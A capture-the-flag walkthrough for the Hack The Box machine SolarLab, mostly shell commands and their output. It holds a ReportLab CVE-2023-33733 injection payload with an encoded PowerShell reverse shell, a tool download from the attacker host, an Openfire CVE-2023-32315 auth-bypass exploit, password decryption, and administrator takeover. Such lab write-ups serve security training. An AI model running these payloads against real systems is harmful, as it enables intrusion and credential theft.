# SolarLab-https://www.hackthebox.com/machines/solarlab

```bash
ping 10.129.231.39 
PING 10.129.231.39 (10.129.231.39) 56(84) bytes of data.
64 bytes from 10.129.231.39: icmp_seq=1 ttl=127 time=64.4 ms
64 bytes from 10.129.231.39: icmp_seq=2 ttl=127 time=66.1 ms
^C
--- 10.129.231.39 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 64.387/65.233/66.079/0.846 ms

nmap -sV -sC 10.129.231.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 06:06 EDT
Nmap scan report for 10.129.231.39
Host is up (0.084s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-09-13T10:06:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.00 seconds

sudo nano /etc/hosts
10.129.231.39   solarlab.htb

ffuf -u http://solarlab.htb -H "Host: FUZZ.solarlab.htb" -w //usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://solarlab.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.solarlab.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 479 req/sec :: Duration: [0:03:36] :: Errors: 0 ::

nmap -sV -sC 10.129.231.39 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 06:18 EDT
Nmap scan report for solarlab.htb (10.129.231.39)
Host is up (0.068s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-title: SolarLab Instant Messenger
|_http-server-header: nginx/1.24.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-13T10:20:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.34 seconds

# try to visit http://solarlab.htb:6791/. We see that http://report.solarlab.htb:6791/.

sudo nano /etc/hosts
10.129.231.39   solarlab.htb report.solarlab.htb

# We see login page now.

# smbclient: A command-line tool that allows you to access shared files and printers on a network using the SMB/CIFS protocol. We saw smb in nmap scan so let's check it.
# The command smbclient -L //solarlab.htb/ is used to list the available shares on a Windows or Samba server.

smbclient -L //solarlab.htb/ 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to solarlab.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

# The command smbclient -N //solarlab.htb/Documents is used to access an SMB (Server Message Block) file share over a network.

smbclient -N //solarlab.htb/Documents
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Apr 26 10:47:14 2024
  ..                                 DR        0  Fri Apr 26 10:47:14 2024
  concepts                            D        0  Fri Apr 26 10:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023

                7779839 blocks of size 4096. 1894582 blocks available
smb: \> get details-file.xlsx
getting file \details-file.xlsx of size 12793 as details-file.xlsx (27.0 KiloBytes/sec) (average 27.0 KiloBytes/sec)

# Open the file in excel and you will see usernames and passwords

blake.byte:ThisCanB3typedeasily1@
AlexanderK:danenacia9234n
ClaudiaS:dadsfawe9dafkn

# We are getting user authentication error with alexanderK and ClaudiaS but user not found with blake.byte
# We might try blakeB because it looks similar to alexanders and claudias username.
# We are in! blakeB:ThisCanB3typedeasily1@

# Open Leave Request

<img width="1101" alt="image" src="https://github.com/user-attachments/assets/5b03ff50-95be-4d00-8ec2-682846acfb03">


# You can fill it like i did in the image. Just upload random file.

<img width="1101" alt="image" src="https://github.com/user-attachments/assets/afe6ee5b-8fd1-4ac4-8580-b9c8a989cba3">

# Generated this. I checked the request from Burp suite and found out this:

 %PDF-1.4
% ReportLab Generated PDF document http://www.reportlab.com
1 0 obj

# Let's check reportlab cve https://github.com/c53elyas/CVE-2023-33733

add_paragraph("""
            <para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>""", content)
build_document(doc, content)

# Copy this part and create a reverse shell from: https://www.revshells.com
# set your ip adress the port that you want and choose PowerShell #3 (Base64) and copy the value and paste it instead of touch /tmp/exploited

            <para>
              <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA0ACIALAA1ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
                exploit
                </font>
            </para>""", content)
build_document(doc, content)

# Refill the document and intercept it. and paste this under "leave request" remember to press enter to make it work it needs to look red

sudo  nc -lnvp 5000

listening on [any] 5000 ...
connect to [10.10.16.24] from (UNKNOWN) [10.129.231.39] 64658
ls


    Directory: C:\Users\blake\Documents\app


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----          5/2/2024  12:30 PM                instance                                                             
d-----         9/13/2024   2:24 PM                reports                                                              
d-----        11/17/2023  10:01 AM                static                                                               
d-----        11/17/2023  10:01 AM                templates                                                            
d-----         9/13/2024   3:06 PM                __pycache__                                                          
-a----        11/17/2023   9:59 AM           1278 app.py                                                               
-a----        11/16/2023   2:17 PM            315 models.py                                                            
-a----        11/18/2023   6:59 PM           7790 routes.py                                                            
-a----          5/2/2024   6:26 PM           3352 utils.py                                                             


PS C:\Users\blake\Documents\app> cd ..
PS C:\Users\blake\Documents> cd ..
PS C:\Users\blake> cd Desktop
PS C:\Users\blake\Desktop> ls


    Directory: C:\Users\blake\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---         9/13/2024   1:05 PM             34 user.txt                                                             


PS C:\Users\blake\Desktop> cat user.txt
4858046ad58a534382b4cf9cbead94a7
```
```bash
PS C:\Users\blake\Documents\app> cd instance
PS C:\Users\blake\Documents\app\instance> ls


    Directory: C:\Users\blake\Documents\app\instance


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          5/2/2024  12:30 PM          12288 users.db                                                             


PS C:\Users\blake\Documents\app\instance> cat users.db
SQLite format 3@  .j?
?!!??+?9tableuseruserCREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(50) NOT NULL, 
        password VARCHAR(100) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
)';indexsqlite_autoindex_user_1user
????!)alexanderkHotP!fireguard'claudias007poiuytrewq 9blakebThisCanB3typedeasily1@
????!alexanderk
               claudias         blakeb
PS C:\Users\blake\Documents\app\instance> 

# We found their true password.

PS C:\Users\blake\Documents\app\instance> cd ../../.. 
PS C:\Users\blake> cd ..
PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/17/2023  10:03 AM                Administrator                                                        
d-----        11/16/2023   9:43 PM                blake                                                                
d-----        11/17/2023   2:13 PM                openfire                                                             
d-r---        11/17/2023  12:54 PM                Public

PS C:\Users\blake\Desktop> Invoke-WebRequest -Uri http://10.10.16.24:8000/chisel.exe -OutFile C:\Users\blake\Desktop\chisel.exe

PS C:\Users\blake\Desktop> PS C:\Users\blake\Desktop> ls


    Directory: C:\Users\blake\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/13/2024   3:49 PM        9310208 chisel.exe                                                           
-ar---         9/13/2024   1:05 PM             34 user.txt                                                             


PS C:\Users\blake\Desktop> .\chisel.exe client 10.10.16.24:1234 R:9090:127.0.0.1:9090

chisel server --socks5 --reverse -p 1234

2024/09/13 08:47:47 server: Reverse tunnelling enabled
2024/09/13 08:47:47 server: Fingerprint EpxB7bk18xbG6Qknt4UhHo4sK5/SHwMKlNAH98yXIok=
2024/09/13 08:47:47 server: Listening on http://0.0.0.0:1234
2024/09/13 08:50:32 server: session#1: Client version (1.10.0) differs from server version (1.10.0-0kali1)
2024/09/13 08:50:32 server: session#1: tun: proxy#R:9090=>9090: Listening



# Visit http://127.0.0.1:9090/login.jsp?url=%2Findex.jsp to see openfire login page.

# https://github.com/miko550/CVE-2023-32315 Download. Openfire cve.

pip3 install -r requirements.txt                  
Defaulting to user installation because normal site-packages is not writeable
Collecting HackRequests (from -r requirements.txt (line 1))
  Downloading HackRequests-1.2-py3-none-any.whl.metadata (677 bytes)
Downloading HackRequests-1.2-py3-none-any.whl (7.3 kB)
Installing collected packages: HackRequests
Successfully installed HackRequests-1.2
                                                                                                   
 python3 CVE-2023-32315.py -t http://127.0.0.1:9090


 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝
                                                                                                       
Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
Use at your own risk!

[..] Checking target: http://127.0.0.1:9090
Successfully retrieved JSESSIONID: node01ud0nsh3ywdnojqwsj4m0niq01.node0 + csrf: Uwe0u0h0f6P8Z3T
User added successfully: url: http://127.0.0.1:9090 username: 7iz7a4 password: z3hymu

# Login to Openfire with credentials.

# Go to plugins and upload openfire-management-tool-plugin.jar which will give us a server management tool
# go to server server settings management tools and default password is 123 use it
# click on program home page and choose system command
# create another reverseshell from https://www.revshells.com with port 4444
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

sudo nc -lvnp 4444  
[sudo] password for boreas: 
listening on [any] 4444 ...
connect to [10.10.16.24] from (UNKNOWN) [10.129.231.39] 64751
id
PS C:\Program Files\Openfire\bin> id
PS C:\Program Files\Openfire\bin> ls


    Directory: C:\Program Files\Openfire\bin


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/17/2023   2:11 PM                extra                                                                
-a----         11/9/2022   6:00 PM         379904 openfire-service.exe                                                 
-a----         2/16/2022   5:55 PM            795 openfire.bat                                                         
-a----         11/9/2022   6:00 PM         370688 openfire.exe                                                         
-a----         11/9/2022   6:00 PM         370688 openfired.exe

PS C:\Program Files\Openfire\embedded-db> ls


    Directory: C:\Program Files\Openfire\embedded-db


Mode                 LastWriteTime         Length Name                                                          
----                 -------------         ------ ----                                                          
d-----         9/13/2024   1:05 PM                openfire.tmp                                                  
-a----         9/13/2024   1:05 PM              0 openfire.lck                                                  
-a----         9/13/2024   4:02 PM           1373 openfire.log                                                  
-a----         9/13/2024   1:05 PM            106 openfire.properties                                           
-a----          5/7/2024   9:53 PM          16161 openfire.script  

PS C:\Program Files\Openfire\embedded-db> type openfire.script

INSERT INTO BLOCKS VALUES(0,2147483647,0)
SET SCHEMA PUBLIC
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')

password:becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442

# We found password key too INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)

# We will use this to decrypt https://github.com/c0rdis/openfire_decrypt/blob/master/OpenFireDecryptPass.java

java OpenFireDecryptPass.java becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)

 crackmapexec smb solarlab.htb -u administrator -p 'ThisPasswordShouldDo!@' 
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         solarlab.htb    445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         solarlab.htb    445    SOLARLAB         [+] solarlab\administrator:ThisPasswordShouldDo!@ (Pwn3d!)

impacket-smbexec administrator:'ThisPasswordShouldDo!@'@solarlab.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
5875cf313c3af7026709222619f14396



```
